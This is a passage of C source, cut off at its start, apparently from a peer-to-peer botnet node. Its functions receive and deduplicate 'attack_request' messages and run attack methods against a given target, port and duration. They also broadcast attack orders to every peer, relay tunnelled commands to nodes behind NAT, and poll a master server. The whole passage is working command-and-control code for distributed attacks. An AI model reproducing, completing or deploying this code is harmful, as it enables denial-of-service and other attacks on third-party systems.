        p2p_send_to_peer(n,from->node_id,jb_get(&jr),jb_len(&jr)); return;
    }
    if(rid[0]&&attack_seen(n,rid)){
        LOG("P2P","Dup attack req ignored (%s)",rid); return;
    }
    if(rid[0]) attack_mark(n,rid);

    char pid[32]={0};
    int ok=(exec_method(n,meth,tgt,(int)tsec,(int)port_ll,pid,sizeof pid)==0);
    jb_kv_bool(&jr,"success",ok);
    if(ok){jb_kv_str(&jr,"pid",pid);jb_kv_str(&jr,"target",tgt);
           jb_kv_int(&jr,"time",tsec);jb_kv_str(&jr,"methods",meth);}
    else   jb_kv_str(&jr,"error","EXEC_FAILED");
    jb_obj_end(&jr);
    p2p_send_to_peer(n,from->node_id,jb_get(&jr),jb_len(&jr));
}

static void handle_status_request(P2PNode *n, Peer *from, const char *j, size_t l) {
    char rid[P2P_REQUEST_ID_LEN]={0};
    json_get_str(j,l,"requestId",rid,sizeof rid);
    char resp[2048]; JsonBuf jr; jb_init(&jr,resp,sizeof resp);
    jb_obj_begin(&jr);
    jb_kv_str(&jr,"type","status_response"); jb_kv_str(&jr,"requestId",rid);
    jb_kv_str(&jr,"nodeId",n->cfg.node_id);
    jb_kv_str(&jr,"mode",n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    jb_kv_int(&jr,"peers",n->peer_count);
    jb_kv_int(&jr,"knownPeers",n->known_peer_count);
    jb_kv_int(&jr,"methodsCount",n->method_count);
    jb_kv_str(&jr,"methodsVersion",n->methods_version);
    jb_kv_int(&jr,"msgsSent",(long long)n->stats.msgs_sent);
    jb_kv_int(&jr,"msgsRecv",(long long)n->stats.msgs_recv);
    jb_obj_end(&jr);
    p2p_send_to_peer(n,from->node_id,jb_get(&jr),jb_len(&jr));
}

static void handle_tunnel_request(P2PNode *n, Peer *from, const char *j, size_t l) {
    char tid[33]={0},target[P2P_NODE_ID_LEN]={0},src[P2P_NODE_ID_LEN]={0},mtype[64]={0};
    json_get_str(j,l,"tunnelId",    tid,   sizeof tid);
    json_get_str(j,l,"targetNodeId",target,sizeof target);
    json_get_str(j,l,"sourceNodeId",src,   sizeof src);
    json_get_str(j,l,"messageType", mtype, sizeof mtype);
    const char *payload; size_t plen; int has_p=json_get_raw(j,l,"payload",&payload,&plen);

    Peer *tgt=peer_get(n,target);
    char resp[256]; JsonBuf jr; jb_init(&jr,resp,sizeof resp);
    jb_obj_begin(&jr); jb_kv_str(&jr,"type","tunnel_response"); jb_kv_str(&jr,"tunnelId",tid);

    if(!tgt){
        jb_kv_bool(&jr,"success",0); jb_kv_str(&jr,"error","target not connected");
        jb_obj_end(&jr);
        p2p_send_to_peer(n,from->node_id,jb_get(&jr),jb_len(&jr)); return;
    }

    /* Build forwarded message */
    static char fwd[P2P_MSG_MAX];
    int fwd_len=snprintf(fwd,sizeof fwd,
        "{\"type\":\"tunnel_delivery\",\"tunnelId\":\"%s\","
        "\"sourceNodeId\":\"%s\",\"relayNodeId\":\"%s\","
        "\"messageType\":\"%s\",\"payload\":%.*s}",
        tid,src,n->cfg.node_id,mtype,
        has_p?(int)plen:4, has_p?payload:"null");
    int ok=(fwd_len>0&&fwd_len<P2P_MSG_MAX)&&
            p2p_send_to_peer(n,target,fwd,(size_t)fwd_len);
    n->stats.tunnel_forwarded++;

    jb_kv_bool(&jr,"success",ok);
    jb_kv_str(&jr,"targetNodeId",target);
    jb_kv_str(&jr,"relayNodeId",n->cfg.node_id);
    if(!ok) jb_kv_str(&jr,"error","forward failed");
    jb_obj_end(&jr);
    p2p_send_to_peer(n,from->node_id,jb_get(&jr),jb_len(&jr));
    LOG("P2P-TUNNEL","%s tunnel %.8s→%.8s via relay",ok?"✓":"✗",src,target);
}

static void handle_tunnel_delivery(P2PNode *n, Peer *relay, const char *j, size_t l) {
    char src[P2P_NODE_ID_LEN]={0};
    json_get_str(j,l,"sourceNodeId",src,sizeof src);
    relay_set(n,src,relay->node_id);
    const char *payload; size_t plen;
    if(!json_get_raw(j,l,"payload",&payload,&plen)) return;
    /* re-dispatch as if came from src */
    Peer *sp=peer_get(n,src);
    if(!sp){
        Peer tmp={0}; strncpy(tmp.node_id,src,P2P_NODE_ID_LEN-1); tmp.fd=-1;
        handle_peer_message(n,&tmp,payload,plen);
    } else {
        handle_peer_message(n,sp,payload,plen);
    }
}

static void handle_reverse_list(P2PNode *n, Peer *from, const char *j, size_t l) {
    const char *arr; size_t alen;
    if(!json_get_raw(j,l,"reverseNodeIds",&arr,&alen)) return;
    const char *p=arr, *end=arr+alen;
    if(*p=='[') p++;
    while(p<end){
        while(p<end&&(*p==','||isspace((unsigned char)*p))) p++;
        if(p>=end||*p==']') break;
        if(*p!='"'){p++;continue;}
        p++;
        const char *s=p; while(p<end&&*p!='"') p++;
        size_t sl=(size_t)(p-s); if(p<end) p++;
        if(sl>0&&sl<P2P_NODE_ID_LEN){
            char rid[P2P_NODE_ID_LEN]; memcpy(rid,s,sl); rid[sl]='\0';
            if(strcmp(rid,n->cfg.node_id)) relay_set(n,rid,from->node_id);
        }
    }
}

static void handle_connection_rejected(P2PNode *n, Peer *from,
                                        const char *j, size_t l) {
    char reason[64]={0};
    json_get_str(j,l,"reason",reason,sizeof reason);
    LOG("P2P","Rejected by %.8s: %s",from->node_id,reason);
    /* Parse referrals */
    const char *refs; size_t rlen;
    if(!json_get_raw(j,l,"referrals",&refs,&rlen)) return;
    const char *p=refs,*end=refs+rlen;
    if(*p=='[') p++;
    while(p<end){
        while(p<end&&(*p==','||isspace((unsigned char)*p))) p++;
        if(p>=end||*p==']') break;
        if(*p!='{'){p++;continue;}
        const char *os=p; int dep=0; const char *pp=p;
        while(pp<end){if(*pp=='{')dep++;else if(*pp=='}'&&--dep==0){pp++;break;}pp++;}
        size_t ol=(size_t)(pp-os);
        char nid[P2P_NODE_ID_LEN]={0},nip[P2P_IP_LEN]={0}; long long np=0;
        json_get_str(os,ol,"nodeId",nid,sizeof nid);
        json_get_str(os,ol,"ip",nip,sizeof nip);
        json_get_int(os,ol,"port",&np);
        if(nid[0]&&nip[0]&&np>0)
            known_upsert(n,nid,nip,(int)np,NODE_MODE_DIRECT,1);
        p=pp;
    }
}

static void handle_peer_message(P2PNode *n, Peer *p, const char *json, size_t len) {
    char type[64]={0};
    if(!json_get_str(json,len,"type",type,sizeof type)) return;
    p->last_seen=time(NULL); p->msgs_recv++; n->stats.msgs_recv++;

    if     (!strcmp(type,"welcome"))             handle_welcome(n,p,json,len);
    else if(!strcmp(type,"ping")){
        size_t ol; const char *po=build_pong(&ol);
        p2p_send_to_peer(n,p->node_id,po,ol);
    }
    else if(!strcmp(type,"pong"))                p->last_heartbeat=time(NULL);
    else if(!strcmp(type,"attack_request"))      handle_attack_request(n,p,json,len);
    else if(!strcmp(type,"attack_response"))     LOG("P2P","Attack resp from %.8s",p->node_id);
    else if(!strcmp(type,"status_request"))      handle_status_request(n,p,json,len);
    else if(!strcmp(type,"tunnel_request"))      handle_tunnel_request(n,p,json,len);
    else if(!strcmp(type,"tunnel_delivery"))     handle_tunnel_delivery(n,p,json,len);
    else if(!strcmp(type,"peer_reverse_list"))   handle_reverse_list(n,p,json,len);
    else if(!strcmp(type,"connection_rejected")) handle_connection_rejected(n,p,json,len);
    else if(!strcmp(type,"goodbye"))             peer_disconnected(n,p->node_id);
    else LOG("P2P","Unknown msg '%s' from %.8s",type,p->node_id);
}

static void peer_disconnected(P2PNode *n, const char *id) {
    LOG("P2P","Peer %.8s disconnected",id);
    relay_purge_by_relay(n,id);
    peer_remove(n,id);
}

/* ─────────────────────────────────────────────────────────────
 * Incoming connection (server-side)
 * ───────────────────────────────────────────────────────────── */

static void accept_peer(P2PNode *n, int cfd, struct sockaddr_in *addr) {
    char rip[P2P_IP_LEN];
    inet_ntop(AF_INET,&addr->sin_addr,rip,sizeof rip);

    if(n->peer_count>=n->cfg.max_peers){
        /* Send rejection with referrals */
        static char rbuf[1024]; JsonBuf rj; jb_init(&rj,rbuf,sizeof rbuf);
        jb_obj_begin(&rj); jb_kv_str(&rj,"type","connection_rejected");
        jb_kv_str(&rj,"reason","max_peers_reached");
        jb_kv_int(&rj,"maxPeers",n->cfg.max_peers);
        jb_obj_end(&rj);
        send_framed(cfd,jb_get(&rj),jb_len(&rj));
        close(cfd); return;
    }

    /* Temporary ID until we receive welcome from peer */
    char tmp[P2P_NODE_ID_LEN];
    snprintf(tmp,sizeof tmp,"tmp_%s_%d",rip,(int)ntohs(addr->sin_port));

    set_nonblocking(cfd); set_keepalive(cfd);

    LOCK();
    Peer *p=peer_add(n,tmp);
    UNLOCK();
    if(!p){close(cfd);return;}
    p->fd=cfd; strncpy(p->ip,rip,P2P_IP_LEN-1);
    p->connected_at=p->last_seen=p->last_heartbeat=time(NULL);
    p->local_mode=n->mode; p->remote_mode=NODE_MODE_DIRECT;

    /* Send our welcome first */
    size_t wl; const char *w=build_welcome(n,&wl);
    if(send_framed(cfd,w,wl)<0){LOCK();peer_remove(n,tmp);UNLOCK();return;}
    p->msgs_sent++; n->stats.msgs_sent++;
    LOG("P2P-SERVER","Accepted %s (tmp %.10s)",rip,tmp);
}

/* ─────────────────────────────────────────────────────────────
 * Outbound connect
 * ───────────────────────────────────────────────────────────── */

int p2p_connect_to_peer(P2PNode *n, const char *id,
                         const char *ip, int port, NodeMode mode) {
    if(!id||!ip||port<=0) return -1;
    if(!strcmp(id,n->cfg.node_id)) return -1;
    if(!strcmp(ip,n->cfg.node_ip)&&port==n->cfg.node_port) return -1;
    if(mode==NODE_MODE_REVERSE) return -1;

    LOCK();
    int skip = (peer_get(n,id)!=NULL || is_blacklisted(n,id) ||
                conn_lock_has(n,id)  || n->peer_count>=n->cfg.max_peers);
    if(!skip) conn_lock_set(n,id);
    UNLOCK();
    if(skip) return -1;

    n->stats.conn_attempts++;
    LOG("P2P","Connecting to %.8s at %s:%d",id,ip,port);

    int fd=tcp_connect(ip,port,n->cfg.conn_timeout);
    if(fd<0){
        LOCK(); conn_lock_del(n,id); fail_inc(n,id); UNLOCK();
        n->stats.conn_failures++;
        LOG("P2P","Failed → %.8s: %s",id,strerror(errno));
        return -1;
    }
    set_nonblocking(fd);

    LOCK();
    if(peer_get(n,id)){UNLOCK();close(fd);conn_lock_del(n,id);return 0;}
    Peer *p=peer_add(n,id);
    UNLOCK();
    if(!p){close(fd);LOCK();conn_lock_del(n,id);UNLOCK();return -1;}

    p->fd=fd; strncpy(p->ip,ip,P2P_IP_LEN-1);
    p->port=port; p->local_mode=n->mode; p->remote_mode=mode;
    p->is_outbound=1; p->is_reverse_node=(mode==NODE_MODE_REVERSE);
    p->connected_at=p->last_seen=p->last_heartbeat=time(NULL);

    LOCK(); conn_lock_del(n,id); fail_reset(n,id); UNLOCK();

    /* Send welcome */
    size_t wl; const char *w=build_welcome(n,&wl);
    if(send_framed(fd,w,wl)<0){LOCK();peer_remove(n,id);UNLOCK();return -1;}
    p->msgs_sent++; n->stats.msgs_sent++;
    n->stats.conn_successes++; n->stats.direct_connections++;

    known_upsert(n,id,ip,port,mode,1);
    flush_queue(n,p);
    LOG("P2P","Connected to %.8s at %s:%d",id,ip,port);
    return 0;
}

/* ─────────────────────────────────────────────────────────────
 * Broadcast attack
 * ───────────────────────────────────────────────────────────── */

int p2p_broadcast_attack(P2PNode *n, const char *target,
                          int tsec, int port, const char *method) {
    static char buf[2048]; JsonBuf j; jb_init(&j,buf,sizeof buf);
    char rid[17]; rand_hex(rid,8);
    jb_obj_begin(&j);
    jb_kv_str(&j,"type","attack_request"); jb_kv_str(&j,"requestId",rid);
    jb_kv_str(&j,"target",target); jb_kv_int(&j,"time",tsec);
    jb_kv_int(&j,"port",port);     jb_kv_str(&j,"methods",method);
    jb_kv_str(&j,"sourceNodeId",n->cfg.node_id);
    jb_obj_end(&j);
    int sent=p2p_broadcast(n,jb_get(&j),jb_len(&j),NULL);
    n->stats.attacks_broadcast++;
    LOG("P2P","Broadcast attack to %d peers (target=%s method=%s)",sent,target,method);
    return sent;
}

/* ─────────────────────────────────────────────────────────────
 * Status JSON
 * ───────────────────────────────────────────────────────────── */

int p2p_get_status_json(P2PNode *n, char *buf, size_t bufsz) {
    JsonBuf j; jb_init(&j,buf,bufsz);
    jb_obj_begin(&j);
    jb_kv_str(&j,"nodeId",n->cfg.node_id);
    jb_kv_str(&j,"nodeIp",n->cfg.node_ip);
    jb_kv_int(&j,"nodePort",n->cfg.node_port);
    jb_kv_str(&j,"mode",n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    jb_kv_bool(&j,"serverReady",n->server_ready);
    jb_kv_bool(&j,"masterReachable",n->master_reachable);
    jb_kv_int(&j,"peersConnected",n->peer_count);
    jb_kv_int(&j,"peersKnown",n->known_peer_count);
    jb_kv_int(&j,"methodsCount",n->method_count);
    jb_kv_str(&j,"methodsVersion",n->methods_version);
    jb_key(&j,"stats"); jb_obj_begin(&j);
    jb_kv_int(&j,"connAttempts",(long long)n->stats.conn_attempts);
    jb_kv_int(&j,"connSuccesses",(long long)n->stats.conn_successes);
    jb_kv_int(&j,"connFailures",(long long)n->stats.conn_failures);
    jb_kv_int(&j,"msgsSent",(long long)n->stats.msgs_sent);
    jb_kv_int(&j,"msgsRecv",(long long)n->stats.msgs_recv);
    jb_kv_int(&j,"tunnelFwd",(long long)n->stats.tunnel_forwarded);
    jb_kv_int(&j,"permLocks",(long long)n->stats.permanent_locks);
    jb_kv_int(&j,"attacksBroadcast",(long long)n->stats.attacks_broadcast);
    jb_obj_end(&j);
    /* Connected peers list */
    jb_key(&j,"connectedPeers"); jb_arr_begin(&j);
    for(int h=0;h<256;h++)
        for(Peer *p=n->peers[h];p;p=p->next){
            jb_obj_begin(&j);
            jb_kv_str(&j,"nodeId",p->node_id);
            jb_kv_str(&j,"ip",p->ip);
            jb_kv_int(&j,"port",p->port);
            jb_kv_str(&j,"remoteMode",p->remote_mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
            jb_kv_bool(&j,"isOutbound",p->is_outbound);
            jb_kv_bool(&j,"isRelayProvider",p->is_relay_provider);
            jb_kv_int(&j,"uptimeSec",(long long)(time(NULL)-p->connected_at));
            jb_kv_int(&j,"msgsSent",(long long)p->msgs_sent);
            jb_kv_int(&j,"msgsRecv",(long long)p->msgs_recv);
            jb_obj_end(&j);
        }
    jb_arr_end(&j);
    jb_obj_end(&j);
    return j.err?-1:(int)j.len;
}

/* ─────────────────────────────────────────────────────────────
 * Background threads
 * ───────────────────────────────────────────────────────────── */

static void *thr_master(void *arg) {
    P2PNode *n=(P2PNode*)arg;
    sleep(3);
    while(!n->shutting_down){
        p2p_do_master_signaling(n);
        sleep((unsigned)n->cfg.master_signaling_interval);
    }
    return NULL;
}

static void *thr_autoconn(void *arg) {
    P2PNode *n=(P2PNode*)arg;
    sleep((unsigned)n->cfg.auto_connect_delay);
    while(!n->shutting_down){
        LOCK();
        /* Collect candidates first to avoid holding lock during connect */
        static char ids[64][P2P_NODE_ID_LEN];
        static char ips[64][P2P_IP_LEN];
        static int  ports[64];
        static NodeMode modes[64];
        int cnt=0;
        for(int h=0;h<256&&cnt<64;h++)
            for(KnownPeer *k=n->known_peers[h];k&&cnt<64;k=k->next)
                if(k->can_connect&&k->mode==NODE_MODE_DIRECT&&k->ip[0]&&k->port>0
                   &&strcmp(k->node_id,n->cfg.node_id)
                   &&!peer_get(n,k->node_id)&&!is_blacklisted(n,k->node_id)
                   &&!conn_lock_has(n,k->node_id)&&n->peer_count<n->cfg.max_peers){
                    strncpy(ids[cnt], k->node_id,P2P_NODE_ID_LEN-1);
                    strncpy(ips[cnt], k->ip,      P2P_IP_LEN-1);
                    ports[cnt]=k->port; modes[cnt]=k->mode; cnt++;
                }
        UNLOCK();
        for(int i=0;i<cnt&&!n->shutting_down;i++){
            p2p_connect_to_peer(n,ids[i],ips[i],ports[i],modes[i]);
            sleep(1);
        }
        n->stats.last_auto_connect=time(NULL);
        sleep((unsigned)n->cfg.auto_connect_delay);
    }
    return NULL;
}

static void *thr_heartbeat(void *arg) {
    P2PNode *n=(P2PNode*)arg;
    sleep(4);
    while(!n->shutting_down){
        time_t now=time(NULL);
        /* Collect timed-out peers */
        static char dead[128][P2P_NODE_ID_LEN]; int dcnt=0;
        LOCK();
        for(int h=0;h<256;h++)
            for(Peer *p=n->peers[h];p;p=p->next){
                if(p->fd>=0){
                    size_t pl; const char *ping=build_ping(&pl);
                    send_framed(p->fd,ping,pl);
                    p->msgs_sent++; n->stats.msgs_sent++;
                }
                if(now-p->last_seen>(time_t)(n->cfg.heartbeat_interval*3)&&dcnt<128)
                    strncpy(dead[dcnt++],p->node_id,P2P_NODE_ID_LEN-1);
            }
        UNLOCK();
        for(int i=0;i<dcnt;i++){
            LOG("P2P-HEARTBEAT","Timeout %.8s, removing",dead[i]);
            LOCK(); peer_disconnected(n,dead[i]); UNLOCK();
        }
        /* Reap zombie children */
        while(waitpid(-1,NULL,WNOHANG)>0);
        sleep((unsigned)n->cfg.heartbeat_interval);
    }
    return NULL;
}

/* ─────────────────────────────────────────────────────────────
 * Peer ID upgrade: tmp_IP_PORT → real node_id
 * ───────────────────────────────────────────────────────────── */

static void upgrade_peer_id(P2PNode *n, Peer *p, const char *new_id) {
    if(!new_id[0]||!strcmp(new_id,n->cfg.node_id)) return;
    if(!strncmp(p->node_id,"tmp_",4)){
        unsigned oh=str_hash8(p->node_id);
        unsigned nh=str_hash8(new_id);
        /* Unlink from old bucket */
        for(Peer **pp=&n->peers[oh];*pp;pp=&(*pp)->next)
            if(*pp==p){*pp=p->next;break;}
        strncpy(p->node_id,new_id,P2P_NODE_ID_LEN-1);
        /* Insert into new bucket */
        p->next=n->peers[nh]; n->peers[nh]=p;

        /* Unlock if previously locked */
        if(is_perm_locked(n,new_id)) perm_lock_remove(n,new_id);
        flush_queue(n,p);
    }
}

/* ─────────────────────────────────────────────────────────────
 * Main event loop (select-based — portable to all POSIX targets)
 * ───────────────────────────────────────────────────────────── */

void p2p_node_run(P2PNode *n) {
    pthread_t t_hb, t_ac, t_ms;
    pthread_create(&t_hb,NULL,thr_heartbeat,n);
    if(n->cfg.auto_connect)
        pthread_create(&t_ac,NULL,thr_autoconn,n);
    if(n->cfg.master_signaling_enabled)
        pthread_create(&t_ms,NULL,thr_master,n);

    LOG("P2P","Event loop started — port %d mode %s",
        n->cfg.node_port, n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");

    static uint8_t rbuf[65536];

    while(!n->shutting_down){
        fd_set rfds; FD_ZERO(&rfds);
        int maxfd=n->listen_fd;
        FD_SET(n->listen_fd,&rfds);

        LOCK();
        for(int h=0;h<256;h++)
            for(Peer *p=n->peers[h];p;p=p->next)
                if(p->fd>=0){FD_SET(p->fd,&rfds);if(p->fd>maxfd)maxfd=p->fd;}
        UNLOCK();

        struct timeval tv={1,0};
        int r=select(maxfd+1,&rfds,NULL,NULL,&tv);
        if(r<0){if(errno==EINTR)continue;break;}

        /* New connection */
        if(FD_ISSET(n->listen_fd,&rfds)){
            struct sockaddr_in addr; socklen_t al=sizeof addr;
            int cfd=accept(n->listen_fd,(struct sockaddr*)&addr,&al);
            if(cfd>=0){LOCK();accept_peer(n,cfd,&addr);UNLOCK();}
        }

        /* Read from peers — collect (fd,id) snapshot to avoid iterator issues */
        static int   pfds[P2P_MAX_PEERS];
        static char  pids[P2P_MAX_PEERS][P2P_NODE_ID_LEN];
        int pcnt=0;

        LOCK();
        for(int h=0;h<256&&pcnt<P2P_MAX_PEERS;h++)
            for(Peer *p=n->peers[h];p&&pcnt<P2P_MAX_PEERS;p=p->next)
                if(p->fd>=0&&FD_ISSET(p->fd,&rfds)){
                    pfds[pcnt]=p->fd;
                    strncpy(pids[pcnt],p->node_id,P2P_NODE_ID_LEN-1);
                    pcnt++;
                }
        UNLOCK();

        for(int i=0;i<pcnt;i++){
            ssize_t nr=read(pfds[i],rbuf,sizeof rbuf);
            LOCK();
            Peer *p=peer_get(n,pids[i]);
            if(!p){UNLOCK();continue;}

            if(nr<=0){
                peer_disconnected(n,pids[i]);
                UNLOCK(); continue;
            }
            int fr=peer_feed(p,rbuf,(size_t)nr,NULL,NULL);
            /* Process all complete frames */
            while(1){
                char *json; size_t jlen;
                if(p->recv_buf_len<4) break;
                size_t fl=((uint8_t)p->recv_buf[0]<<24)|((uint8_t)p->recv_buf[1]<<16)|
                           ((uint8_t)p->recv_buf[2]<<8) |((uint8_t)p->recv_buf[3]);
                if(fl>(size_t)P2P_MSG_MAX||p->recv_buf_len<4+fl) break;
                json=p->recv_buf+4; jlen=fl;

                /* Upgrade tmp id on first welcome */
                if(!strncmp(p->node_id,"tmp_",4)){
                    char typ[16]={0},nid[P2P_NODE_ID_LEN]={0};
                    json_get_str(json,jlen,"type",typ,sizeof typ);
                    if(!strcmp(typ,"welcome")){
                        json_get_str(json,jlen,"nodeId",nid,sizeof nid);
                        upgrade_peer_id(n,p,nid);
                    }
                }
                handle_peer_message(n,p,json,jlen);
                /* p might have been removed in disconnected handler */
                p=peer_get(n,pids[i]);
                if(!p) break;
                peer_consume_frame(p);
            }
            if(fr<0&&p){
                LOG("P2P","Frame error %.8s",pids[i]);
                peer_disconnected(n,pids[i]);
            }
            UNLOCK();
        }
    }

    /* Join threads */
    pthread_join(t_hb,NULL);
    if(n->cfg.auto_connect)
        pthread_join(t_ac,NULL);
    if(n->cfg.master_signaling_enabled)
        pthread_join(t_ms,NULL);

    LOG("P2P","Event loop exited");
}

/* ─────────────────────────────────────────────────────────────
 * Lifecycle
 * ───────────────────────────────────────────────────────────── */

P2PNode *p2p_node_create(const Config *cfg) {
    P2PNode *n=calloc(1,sizeof*n); if(!n) return NULL;
    n->cfg=*cfg; n->mode=cfg->node_mode;
    n->listen_fd=-1;
    return n;
}

int p2p_node_start(P2PNode *n) {
    n->listen_fd=create_listen_socket(n->cfg.node_port);
    if(n->listen_fd<0){
        LOG("P2P-SERVER","Bind port %d failed: %s",n->cfg.node_port,strerror(errno));
        return -1;
    }
    n->server_ready=1;
    LOG("P2P-SERVER","Listening :%d  id=%.8s...  mode=%s",
        n->cfg.node_port,n->cfg.node_id,
        n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    return 0;
}

void p2p_node_shutdown(P2PNode *n) {
    LOG("P2P","Shutting down...");
    n->shutting_down=1;
    /* Broadcast goodbye */
    size_t gl; const char *bye=build_goodbye(n,&gl);
    LOCK();
    for(int h=0;h<256;h++)
        for(Peer *p=n->peers[h];p;p=p->next)
            if(p->fd>=0) send_framed(p->fd,bye,gl);
    UNLOCK();
    sleep(1);
    /* Close all fds */
    LOCK();
    for(int h=0;h<256;h++)
        for(Peer *p=n->peers[h];p;p=p->next)
            if(p->fd>=0){close(p->fd);p->fd=-1;}
    UNLOCK();
    if(n->listen_fd>=0){close(n->listen_fd);n->listen_fd=-1;}
    LOG("P2P","Shutdown complete");
}

void p2p_node_destroy(P2PNode *n) {
    if(!n) return;
    for(int h=0;h<256;h++){
        Peer *p=n->peers[h];
        while(p){
            Peer *nx=p->next;
            if(p->fd>=0) close(p->fd);
            free(p->recv_buf);
            for(int i=0;i<p->queue_size;i++){
                int ix=(p->queue_head+i)%P2P_QUEUE_MAX;
                free(p->queue[ix].data);
            }
            free(p); p=nx;
        }
        KnownPeer *k=n->known_peers[h];
        while(k){KnownPeer *nx=k->next;free(k);k=nx;}
        RelayRoute *r=n->relay_routes[h];
        while(r){RelayRoute *nx=r->next;free(r);r=nx;}
        Blacklist *b=n->blacklist[h];
        while(b){Blacklist *nx=b->next;free(b);b=nx;}
        PermanentLock *pl=n->perm_locks[h];
        while(pl){PermanentLock *nx=pl->next;free(pl);pl=nx;}
    }
    free(n);
}
